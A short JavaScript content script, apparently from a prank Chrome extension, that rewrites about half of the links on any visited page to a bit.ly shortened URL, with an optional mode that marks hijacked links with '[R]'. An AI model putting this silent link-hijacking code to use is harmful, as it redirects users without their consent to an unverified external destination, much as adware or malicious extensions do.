chrome.runtime.sendMessage({greeting: "extension"}, function(response) {
  console.log(response.farewell);
  localStorage.setItem("on", response.farewell);
  if (localStorage.getItem("on") == "on") {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
      var random = Math.floor((Math.random() * 2) + 1);
      if (random == 2) {
        a[i].href = "http://bit.ly/30QqsQ2";
      }
    }
  }
});
chrome.runtime.sendMessage({greeting: "cheat"}, function(response) {
  console.log(response.farewell);
  localStorage.setItem("cheat", response.farewell);
  if (localStorage.getItem("cheat") == "on") {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
      if (a[i].href == "http://bit.ly/30QqsQ2") {
        let prevLinkText = a[i].innerHTML;
        a[i].innerHTML = "[R] " + prevLinkText;
      }
    }
  }
});


chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    location.reload();
  }
);
